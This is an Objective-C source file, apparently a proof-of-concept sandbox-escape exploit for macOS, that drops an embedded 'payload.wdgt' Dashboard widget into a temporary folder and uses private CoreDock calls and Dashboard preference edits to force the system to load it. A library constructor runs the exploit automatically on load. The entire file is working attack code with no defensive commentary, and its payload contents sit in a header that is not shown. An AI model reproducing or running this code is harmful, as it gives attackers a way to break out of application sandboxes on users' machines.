#import "escape.h"
#include <dlfcn.h>
#include <stdio.h>
#include <sys/stat.h>

extern OSStatus CoreDockSetPreferences(CFDictionaryRef preferenceDict);
extern OSStatus CoreDockSendNotification(CFStringRef);

void exploit() {
  @autoreleasepool {
    NSString *widget = [NSTemporaryDirectory() stringByAppendingPathComponent:@"payload.wdgt"];
    mkdir([widget UTF8String], 0777);

#define EXTRACT(dst, data, len)                                                                                        \
  {                                                                                                                    \
    NSString *str = [widget stringByAppendingPathComponent:dst];                                                       \
    const char *path = [str UTF8String];                                                                               \
    int fd = open(path, O_WRONLY | O_CREAT, 0777);                                                                     \
    write(fd, data, len);                                                                                              \
    close(fd);                                                                                                         \
  }

    EXTRACT(@"main.html", main_html, main_html_len);
    EXTRACT(@"Info.plist", Info_plist, Info_plist_len);
    EXTRACT(@"Default.png", Default_png, Default_png_len);

    CFStringRef domain = CFSTR("com.apple.dashboard");
    CFArrayRef item = (__bridge CFArrayRef) @[ @{
      @"32bit" : @0,
      @"id" : @"AAAAA",
      @"in-layer" : @1,
      @"path" : widget,
      @"percent-offset-x" : @0,
      @"percent-offset-y" : @0,
      @"percent-type" : @2,
      @"percent-x" : @0,
      @"percent-y" : @0,
      @"pos-x" : @0,
      @"pos-y" : @300,
      @"relativepath" : widget,
      @"separate-process" : @0
    } ];

    CoreDockSetPreferences((__bridge CFDictionaryRef) @{@"enabledState" : @1});
    CFPreferencesSetAppValue(CFSTR("mcx-disabled"), CFSTR("NO"), domain);
    CFPreferencesSetAppValue(CFSTR("layer-gadgets"), item, domain);
    CFPreferencesAppSynchronize(domain);

    CoreDockSetPreferences((__bridge CFDictionaryRef) @{@"enabledState" : @2});
    CoreDockSendNotification(CFSTR("com.apple.dashboard.awake"));

    // todo: clean up
    // CoreDockSendNotification(CFSTR("com.apple.dashboard.dismiss"));
    // CoreDockSetPreferences((__bridge CFDictionaryRef) @{@"enabledState" : @1});
    // CFPreferencesSetAppValue(CFSTR("layer-gadgets"), NULL, domain);
    // CFPreferencesAppSynchronize(domain);
  }
}

__attribute__((constructor)) void run(const char *unused) {
  dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
  dispatch_async(dispatch_get_main_queue(), ^{
    exploit();
    dispatch_semaphore_signal(semaphore);
  });
  dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(NSEC_PER_MSEC)));

  // todo: clean up
  while (true)
    sleep(1);
}